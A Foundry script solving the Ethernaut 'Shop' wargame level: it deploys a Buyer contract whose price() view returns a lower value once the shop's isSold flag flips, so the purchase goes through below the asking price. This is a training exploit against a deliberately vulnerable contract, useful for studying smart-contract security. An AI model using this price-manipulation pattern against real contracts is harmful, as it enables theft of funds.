// SPDX-License-Identifier: MIT
pragma solidity 0.8.21;

import {Script, console2} from "forge-std/Script.sol";
import {EthernautHelper} from "../setup/EthernautHelper.sol";

// NOTE You can import your helper contracts & create interfaces here
import {Shop} from "../../challenge-contracts/21-Shop.sol";

contract ShopSolution is Script, EthernautHelper {
    address constant LEVEL_ADDRESS = 0x691eeA9286124c043B82997201E805646b76351a;
    uint256 heroPrivateKey = vm.envUint("PRIVATE_KEY");

    function run() public {
        vm.startBroadcast(heroPrivateKey);
        // NOTE this is the address of your challenge contract
        address challengeInstance = createInstance(LEVEL_ADDRESS);

        ////////////////////////////////////////////////////////////////////////////////////
        // Start of Ric Li C's Solution
        ////////////////////////////////////////////////////////////////////////////////////
        // Step 1: Get original `price()` of the Shop contract;
        Shop shop = Shop(challengeInstance);
        uint originalPrice = shop.price();

        // Step 2: Deploy Buyer contract;
        Buyer buyer = new Buyer(challengeInstance);

        // Step 3: Call `buyCheap()` function of the Buyer contract;
        buyer.buyCheap();

        // Step 4: Confirm that `updatedPrice` is less than `originalPrice`.
        uint updatedPrice = shop.price();
        require(updatedPrice < originalPrice, "Price check failed");

        ////////////////////////////////////////////////////////////////////////////////////
        // End of Ric Li C's Solution
        ////////////////////////////////////////////////////////////////////////////////////

        // SUBMIT CHALLENGE. (DON'T EDIT)
        bool levelSuccess = submitInstance(challengeInstance);
        require(levelSuccess, "Challenge not passed yet");
        vm.stopBroadcast();

        console2.log(successMessage(21));
    }
}

////////////////////////////////////////////////////////////////////////////////////
// Start of Ric Li C's Solution (Extra Contract)
// Additional contract codes to help solve this puzzle
////////////////////////////////////////////////////////////////////////////////////
contract Buyer {
    Shop shop;

    constructor(address shopAddress) {
        shop = Shop(shopAddress);
    }

    function price() external view returns (uint) {
        bool isSold = shop.isSold();
        uint shopPrice = shop.price();

        // If not sold, return shopPrice
        if (!isSold) {
            return shopPrice;
        } else {
            // After sold, return `shopPrice / 2`
            return shopPrice / 2;
        }
    }

    function buyCheap() external {
        shop.buy();
    }
}
